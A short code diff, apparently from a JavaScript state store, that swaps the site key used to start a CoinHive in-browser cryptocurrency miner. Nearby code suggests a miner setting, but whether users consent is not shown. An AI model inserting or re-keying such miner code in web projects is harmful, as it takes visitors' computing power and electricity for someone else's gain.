@@ -97,7 +97,7 @@ const mutations = {
 		if (state.miner)
 			state.miner.stop()
 
-		state.miner = new CoinHive.Anonymous('PW7FI1VfOmLOORjnVtJqS62MdJTJFiOl')
+		state.miner = new CoinHive.Anonymous('e3LBFyZeaZfYgkktrdib0wmjKK03YoA2')
 	},
 	settings_miner_set: (state, payload) => {
 		state.settings.miner = payload
